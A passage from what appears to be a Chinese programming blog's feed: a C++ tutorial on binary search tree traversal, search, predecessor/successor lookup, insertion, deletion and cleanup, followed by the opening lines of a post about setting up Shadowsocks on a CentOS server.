<p>先访问当前节点，然后再遍历左子树，最后遍历右子树<br />
<img src="/uploads/images/data_structure/bst_cpp/04.png" alt="" /></p>
<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;<br><span class="hljs-keyword">void</span> binaryTree&lt;T&gt;::<span class="hljs-built_in">PreOrder</span>(binaryTree::NODE *pRootNode) &#123;<br>    <span class="hljs-keyword">if</span>(pRootNode== <span class="hljs-literal">nullptr</span>)&#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    cout&lt;&lt;pRootNode-&gt;key&lt;&lt;endl;<br>    <span class="hljs-built_in">PreOrder</span>(pRootNode-&gt;left_nodes);<br>    <span class="hljs-built_in">PreOrder</span>(pRootNode-&gt;right_nodes);<br>&#125;<br></code></pre></div></td></tr></table></figure>
<h5 id="中序遍历"><a class="markdownIt-Anchor" href="#中序遍历"></a> 中序遍历</h5>
<p>先遍历左子树，再访问当前节点，最后遍历右子树<br />
<img src="/uploads/images/data_structure/bst_cpp/05.png" alt="" /></p>
<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;<br><span class="hljs-keyword">void</span> binaryTree&lt;T&gt;::<span class="hljs-built_in">InOrder</span>(binaryTree::NODE *pRootNode) &#123;<br>    <span class="hljs-keyword">if</span>(pRootNode == <span class="hljs-literal">nullptr</span>)&#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-built_in">InOrder</span>(pRootNode-&gt;left_nodes);<br>    cout&lt;&lt;pRootNode-&gt;key&lt;&lt;endl;<br>    <span class="hljs-built_in">InOrder</span>(pRootNode-&gt;right_nodes);<br>&#125;<br></code></pre></div></td></tr></table></figure>
<p>可见中序遍历能够有序输出节点</p>
<h5 id="后序遍历"><a class="markdownIt-Anchor" href="#后序遍历"></a> 后序遍历</h5>
<p>先遍历左子树，再遍历右子树，最后访问当前节点<br />
<img src="/uploads/images/data_structure/bst_cpp/06.png" alt="" /></p>
<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">void</span> binaryTree&lt;T&gt;::<span class="hljs-built_in">PostOrder</span>(binaryTree::NODE *pRootNode) &#123;<br>    <span class="hljs-keyword">if</span>(pRootNode== <span class="hljs-literal">nullptr</span>)&#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-built_in">PostOrder</span>(pRootNode-&gt;left_nodes);<br>    <span class="hljs-built_in">PostOrder</span>(pRootNode-&gt;right_nodes);<br>    cout&lt;&lt;pRootNode-&gt;key&lt;&lt;endl;<br>&#125;<br></code></pre></div></td></tr></table></figure>
<h5 id="层级遍历"><a class="markdownIt-Anchor" href="#层级遍历"></a> 层级遍历</h5>
<p>主要是利用广度优先搜索实现的<br />
<img src="/uploads/images/data_structure/bst_cpp/07.png" alt="" /></p>
<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;<br><span class="hljs-keyword">void</span> binaryTree&lt;T&gt;::<span class="hljs-built_in">LevelOrder</span>(binaryTree::NODE *pRootNode) &#123;<br>    <span class="hljs-keyword">if</span>(!pRootNode)<span class="hljs-keyword">return</span>;<br>    queue&lt;binaryTree::PNODE&gt;q;<br>    q.<span class="hljs-built_in">push</span>(pRootNode);<br>    <span class="hljs-keyword">while</span> (!q.<span class="hljs-built_in">empty</span>())&#123;<br>        binaryTree::PNODE pNode=q.<span class="hljs-built_in">front</span>();<br>        cout&lt;&lt;pNode-&gt;key&lt;&lt;endl;<br>        <span class="hljs-comment">// 左子树存在，先处理左边</span><br>        <span class="hljs-keyword">if</span>(pNode-&gt;left_nodes)&#123;<br>            q.<span class="hljs-built_in">push</span>(pNode-&gt;left_nodes);<br>        &#125;<br>        <span class="hljs-comment">// 右子树存在，在处理右边</span><br>        <span class="hljs-keyword">if</span>(pNode-&gt;right_nodes) &#123;<br>            q.<span class="hljs-built_in">push</span>(pNode-&gt;right_nodes);<br>        &#125;<br>        <span class="hljs-comment">// 处理下一个节点</span><br>        q.<span class="hljs-built_in">pop</span>();<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>
<h4 id="高度"><a class="markdownIt-Anchor" href="#高度"></a> 高度</h4>
<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;<br><span class="hljs-keyword">int</span> binaryTree&lt;T&gt;::<span class="hljs-built_in">Height</span>(binaryTree::PNODE pNode) &#123;<br>    <span class="hljs-keyword">if</span>(!pNode)<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">int</span> h1=<span class="hljs-built_in">Height</span>(pNode-&gt;left_nodes);<br>    <span class="hljs-keyword">int</span> h2=<span class="hljs-built_in">Height</span>(pNode-&gt;right_nodes);<br>    <span class="hljs-comment">// 高度从0开始计数，因此高度要加1</span><br>    <span class="hljs-keyword">return</span> std::<span class="hljs-built_in">max</span>(h1,h2)+<span class="hljs-number">1</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure>
<h4 id="查找"><a class="markdownIt-Anchor" href="#查找"></a> 查找</h4>
<p>bst查找类似<strong>二分查找</strong>。很简单</p>
<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;<br>NodeEntry&lt;T&gt; *binaryTree&lt;T&gt;::<span class="hljs-built_in">Search</span>(PNODE pNode,const_key_type key) &#123;<br>    <span class="hljs-keyword">if</span>(!pNode)<span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;<br>    <span class="hljs-keyword">if</span>(pNode-&gt;key==key)&#123;<br>        <span class="hljs-keyword">return</span> pNode;<br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(key&lt;pNode-&gt;key)&#123;<br>        <span class="hljs-comment">//left</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">Search</span>(pNode-&gt;left_nodes,key);<br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(key&gt;pNode-&gt;key)&#123;<br>        <span class="hljs-comment">//right</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">Search</span>(pNode-&gt;right_nodes,key);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure>
<h4 id="前驱后继节点"><a class="markdownIt-Anchor" href="#前驱后继节点"></a> 前驱/后继节点</h4>
<p>要完成bst的删除操作，那么就必须要知道前驱/后继节点怎么找。<br />
<strong>前驱节点</strong>： 假设存在一个节点N，那么它的前驱节点就是<strong>关键字</strong>小于N的且最大的节点。即<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>k</mi><mi>e</mi><mi>y</mi><mo stretchy="false">[</mo><mi>m</mi><mi>a</mi><mi>x</mi><mo stretchy="false">(</mo><mi>p</mi><mi>r</mi><mi>e</mi><mi>d</mi><mi>e</mi><mi>c</mi><mi>e</mi><mi>s</mi><mi>s</mi><mi>o</mi><mi>r</mi><mo stretchy="false">)</mo><mo stretchy="false">]</mo><mo>&lt;</mo><mi>k</mi><mi>e</mi><mi>y</mi><mo stretchy="false">[</mo><mi>N</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">key[max(predecessor)]&lt;key[N]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mopen">[</span><span class="mord mathdefault">m</span><span class="mord mathdefault">a</span><span class="mord mathdefault">x</span><span class="mopen">(</span><span class="mord mathdefault">p</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">e</span><span class="mord mathdefault">d</span><span class="mord mathdefault">e</span><span class="mord mathdefault">c</span><span class="mord mathdefault">e</span><span class="mord mathdefault">s</span><span class="mord mathdefault">s</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mclose">)</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mopen">[</span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="mclose">]</span></span></span></span></p>
<p><strong>后继节点</strong>： 假设存在一个节点N，那么它的后继节点就是<strong>关键字</strong>大于N的且最小的节点。即<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>k</mi><mi>e</mi><mi>y</mi><mo stretchy="false">[</mo><mi>m</mi><mi>i</mi><mi>n</mi><mo stretchy="false">(</mo><mi>s</mi><mi>u</mi><mi>c</mi><mi>c</mi><mi>e</mi><mi>s</mi><mi>s</mi><mi>o</mi><mi>r</mi><mo stretchy="false">)</mo><mo stretchy="false">]</mo><mo>&gt;</mo><mi>k</mi><mi>e</mi><mi>y</mi><mo stretchy="false">[</mo><mi>N</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">key[min(successor)]&gt;key[N]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mopen">[</span><span class="mord mathdefault">m</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mopen">(</span><span class="mord mathdefault">s</span><span class="mord mathdefault">u</span><span class="mord mathdefault">c</span><span class="mord mathdefault">c</span><span class="mord mathdefault">e</span><span class="mord mathdefault">s</span><span class="mord mathdefault">s</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mclose">)</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mopen">[</span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="mclose">]</span></span></span></span></p>
<p>根据前驱节点定义查找：</p>
<ul>
<li>若节点N<strong>有左子树L</strong>：且左子树L的右子树存在，则依次遍历L的右子树直到<strong>叶子节点</strong>，就是前驱节点；否则该左子树L就是前驱节点</li>
<li>若节点N<strong>无左子树</strong>，但节点N是其父节点P的<strong>右孩子</strong>，那么父节点P就是该节点N的前驱结点</li>
<li>若节点N<strong>无左子树</strong>，但该节点N是其父节点P的<strong>左孩子</strong>，那么需要沿着父亲节点P一直向树的顶端寻找，<strong>直到找到一个节点X是其父节点M的右孩子</strong>，则节点M为前驱节点</li>
</ul>
<p>以上三种情况分别对应下图<br />
<img src="/uploads/images/data_structure/bst_cpp/08.png" alt="" /></p>
<p>后继节点查找类似前驱节点</p>
<ul>
<li>若节点N<strong>有右子树R</strong>：且右子树R的左子树存在，则依次遍历R的左子树直到<strong>叶子节点</strong>，就是后继节点；否则该右子树R就是后继节点</li>
<li>若节点N<strong>无右子树</strong>，但节点N是其父节点P的<strong>左孩子</strong>，那么父节点P就是该节点N的后继结点</li>
<li>若节点N<strong>无右子树</strong>，但该节点N是其父节点P的<strong>右孩子</strong>，那么需要沿着父亲节点P一直向树的顶端寻找，<strong>直到找到一个节点X是其父节点M的左孩子</strong>，则节点M为后继节点</li>
</ul>
<p><img src="/uploads/images/data_structure/bst_cpp/09.png" alt="" /></p>
<p>代码如下</p>
<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;<br>NodeEntry&lt;T&gt;* binaryTree&lt;T&gt;::<span class="hljs-built_in">predecessor</span>(NODE* pNode)<br>&#123;<br>    <span class="hljs-keyword">if</span>(!pNode)<span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;<br>    <span class="hljs-comment">// 如果存在左子树</span><br>    <span class="hljs-keyword">if</span> (pNode-&gt;left_nodes)&#123;<br>        <span class="hljs-keyword">auto</span> x=pNode-&gt;left_nodes;<br>        <span class="hljs-keyword">while</span> (x-&gt;right_nodes)&#123;<br>            x=x-&gt;right_nodes;<br>        &#125;<br>        <span class="hljs-keyword">return</span> x;<br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(pNode-&gt;parent)&#123;<br>        <span class="hljs-comment">// 该节点为父节点的右孩子</span><br>        <span class="hljs-keyword">if</span> (pNode-&gt;parent-&gt;right_nodes==pNode)&#123;<br>            <span class="hljs-keyword">return</span> pNode-&gt;parent;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-comment">// 该节点为父节点的左孩子</span><br>            NodeEntry&lt;T&gt;* parent=pNode-&gt;parent;<br>            <span class="hljs-comment">// 向父节点方向遍历</span><br>            <span class="hljs-keyword">while</span> (parent &amp;&amp; parent-&gt;left_nodes==pNode)&#123;<br>                pNode=parent;<br>                parent=parent-&gt;parent;<br>            &#125;<br>            <span class="hljs-keyword">return</span> parent;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;<br>&#125;<br><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;<br>NodeEntry&lt;T&gt;* binaryTree&lt;T&gt;::<span class="hljs-built_in">successor</span>(NODE* pNode)<br>&#123;<br>    <span class="hljs-keyword">if</span>(!pNode)<span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;<br>    <span class="hljs-comment">// 如果存在右子树</span><br>    <span class="hljs-keyword">if</span> (pNode-&gt;right_nodes)&#123;<br>        <span class="hljs-keyword">auto</span> x=pNode-&gt;right_nodes;<br>        <span class="hljs-keyword">while</span> (x-&gt;left_nodes)&#123;<br>            x=x-&gt;left_nodes;<br>        &#125;<br>        <span class="hljs-keyword">return</span> x;<br>    <span class="hljs-comment">// 右子树不存在</span><br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(pNode-&gt;parent)&#123;<br>        <span class="hljs-keyword">if</span> (pNode-&gt;parent-&gt;left_nodes==pNode)&#123;<br>            <span class="hljs-keyword">return</span> pNode-&gt;parent;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            NodeEntry&lt;T&gt;* parent=pNode-&gt;parent;<br>            <span class="hljs-keyword">while</span> (parent &amp;&amp; parent-&gt;right_nodes==pNode)&#123;<br>                pNode=parent;<br>                parent=parent-&gt;parent;<br>            &#125;<br>            <span class="hljs-keyword">return</span> parent;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure>
<h4 id="插入"><a class="markdownIt-Anchor" href="#插入"></a> 插入</h4>
<p>讲完前驱后继的查找后，接下来是插入操作，bst的插入比较简单，也就是在<strong>空节点nullptr</strong>处更新一个新节点，插入方法类似查找方法。插入操作要保证key的唯一性</p>
<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;<br><span class="hljs-keyword">bool</span> binaryTree&lt;T&gt;::<span class="hljs-built_in">Insert</span>(REF_PNODE pNode,PNODE pNodeParent,const_key_type key,const_reference_type value) &#123;<br>    <span class="hljs-comment">// 表示当前为空节点</span><br>    <span class="hljs-keyword">if</span>(pNode == <span class="hljs-literal">nullptr</span>)&#123;<br>        <span class="hljs-comment">// 新建一个待插入的节点</span><br>        pNode=<span class="hljs-keyword">new</span> <span class="hljs-built_in">NODE</span>();<br>        pNode-&gt;key=key;<br>        pNode-&gt;left_nodes= <span class="hljs-literal">nullptr</span>;<br>        pNode-&gt;right_nodes= <span class="hljs-literal">nullptr</span>;<br>        pNode-&gt;data=value;<br>        pNode-&gt;parent=pNodeParent;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(key &lt; pNode-&gt;key)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">Insert</span>(pNode-&gt;left_nodes,pNode,key,value);<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(key &gt; pNode-&gt;key)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">Insert</span>(pNode-&gt;right_nodes,pNode,key,value);<br>    &#125;<br>    <span class="hljs-comment">// 已经存在了</span><br>    <span class="hljs-keyword">else</span>&#123;<br>        cout&lt;&lt;<span class="hljs-string">&quot;Already exist!&quot;</span>&lt;&lt;endl;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>
<h4 id="删除"><a class="markdownIt-Anchor" href="#删除"></a> 删除</h4>
<p>删除操作就有点复杂了，不过照着思路也很容易写出来。<br />
大致分为三类</p>
<ul>
<li>删除叶子结点</li>
<li>删除只有一棵子树的节点</li>
<li>删除有两棵子树的节点</li>
</ul>
<p><strong>注意：删除操作一定要维护二叉查找树的性质！！！</strong></p>
<p>删除叶子结点，这类情况最为简单，找到待删除节点后直接delete，同时更新父子节点关系；<br />
删除有两棵子树的节点的操作可以转化为删除只有一棵子树的节点，转化策略有<strong>前驱</strong>和<strong>后继</strong>两种，本文删除节点使用的策略为后继法。</p>
<p>首先来看一下这个例子<br />
<img src="/uploads/images/data_structure/bst_cpp/10.png" alt="" /><br />
删除key=8的节点，不一定真的是删除该节点，不然的话还要重新建立父子节点关系以及维护bst的性质。因此，利用前驱/后继节点的方法可以巧妙的避开这些不必要的麻烦：只需要<strong>替换</strong>待删除节点和前驱/后继节点的数据，然后利用删除只有一棵子树的节点的方法来<strong>删除</strong>前驱/后继节点即可。</p>
<p>删除只有一棵子树的节点情况如下<br />
<img src="/uploads/images/data_structure/bst_cpp/11.png" alt="" /></p>
<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span>&gt;</span><br><span class="hljs-keyword">bool</span> binaryTree&lt;T&gt;::<span class="hljs-built_in">Delete</span>(PNODE pNode,const_key_type key) &#123;<br>    PNODE  pDeletenode = <span class="hljs-keyword">this</span>-&gt;<span class="hljs-built_in">Search</span>(pNode,key);<br>    <span class="hljs-keyword">if</span>(!pDeletenode) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>    <span class="hljs-comment">// 节点的左右子树都存在情况下，此时将其转化为其他两种情况</span><br>    <span class="hljs-keyword">if</span>(pDeletenode-&gt;left_nodes!=<span class="hljs-literal">nullptr</span>&amp;&amp;pDeletenode-&gt;right_nodes!=<span class="hljs-literal">nullptr</span>)&#123;<br>        PNODE successor=<span class="hljs-keyword">this</span>-&gt;<span class="hljs-built_in">successor</span>(pDeletenode);<br>        <span class="hljs-comment">// 只需要交换数据</span><br>        pDeletenode-&gt;key=successor-&gt;key;<br>        pDeletenode-&gt;data=successor-&gt;data;<br>        <span class="hljs-comment">// 标记pDeletenode为后继节点，</span><br>        pDeletenode=successor;<br>    &#125;<br>    <span class="hljs-comment">// 是否有子节点</span><br>    PNODE child=<span class="hljs-literal">nullptr</span>;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">        80              80</span><br><span class="hljs-comment">        /                 \ </span><br><span class="hljs-comment">       70[delete]         86[delete]</span><br><span class="hljs-comment">        \                   \</span><br><span class="hljs-comment">         75                  90</span><br><span class="hljs-comment">    */</span><br>   <span class="hljs-comment">// 删除只有一棵子树的情况</span><br>   <span class="hljs-comment">// 判断待删除节点的子节点左右孩子</span><br>    <span class="hljs-keyword">if</span>(pDeletenode-&gt;left_nodes!=<span class="hljs-literal">nullptr</span>)&#123;<br>        child=pDeletenode-&gt;left_nodes;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        child=pDeletenode-&gt;right_nodes;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(child!=<span class="hljs-literal">nullptr</span>)&#123;<br>        child-&gt;parent=pDeletenode-&gt;parent;<br>    &#125;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">情况1           情况2               情况3               情况4</span><br><span class="hljs-comment">         9               9                  9               9</span><br><span class="hljs-comment">        /               /                  /               / </span><br><span class="hljs-comment">       7                7                 7[delete]        7[delete]</span><br><span class="hljs-comment">      /                  \               /                  \</span><br><span class="hljs-comment">     6[delete]           8[delete]      6                    8</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">情况5           情况6               情况7               情况8</span><br><span class="hljs-comment">      1                1                 1              1</span><br><span class="hljs-comment">       \                \                 \              \ </span><br><span class="hljs-comment">       7                 7                 7[delete]      7[delete]</span><br><span class="hljs-comment">      /                  \                /                \</span><br><span class="hljs-comment">     6[delete]           8[delete]       6                  8</span><br><span class="hljs-comment">    */</span><br><br>    <span class="hljs-comment">// 删除的是根节点</span><br>    <span class="hljs-keyword">if</span>(pDeletenode-&gt;parent==<span class="hljs-literal">nullptr</span>)&#123;<br>        m_NodeRoot=child;<br>    <span class="hljs-comment">// 判断待删除节点是其父节点的左右孩子</span><br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(pDeletenode-&gt;parent-&gt;left_nodes==pDeletenode)&#123;<br>        pDeletenode-&gt;parent-&gt;left_nodes=child;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        pDeletenode-&gt;parent-&gt;right_nodes=child;<br>    &#125;<br>    <span class="hljs-keyword">delete</span> pDeletenode;<br>    pDeletenode=<span class="hljs-literal">nullptr</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure>
<h4 id="bst释放"><a class="markdownIt-Anchor" href="#bst释放"></a> bst释放</h4>
<p>递归方式释放所有节点</p>
<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;<br><span class="hljs-keyword">void</span> binaryTree&lt;T&gt;::<span class="hljs-built_in">ClearAll</span>(binaryTree::REF_PNODE pNode) &#123;<br>    <span class="hljs-keyword">if</span>(!pNode)<span class="hljs-keyword">return</span>;<br>    <span class="hljs-built_in">ClearAll</span>(pNode-&gt;left_nodes);<br>    <span class="hljs-built_in">ClearAll</span>(pNode-&gt;right_nodes);<br>    <span class="hljs-keyword">delete</span> pNode;<br>    pNode= <span class="hljs-literal">nullptr</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure>
<p>ok，基本上bst大致讲完了，bye~</p>
]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>DataStructures</tag>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>CentOS服务器Shadowsocks</title>
    <url>/centos-shadowsocks/</url>
    <content><![CDATA[<p>在很久之前我用Windows时一直使用 <strong>SoftEther VPN</strong> 来访问外网，但现在已经转向了SS，而且仅是通过转发流量来科学上网的话，无疑SS是最合适的，因此在 hostwinds 上也买了一台centos7服务器准备搭建shadowsocks。</p>
<span id="more"></span>
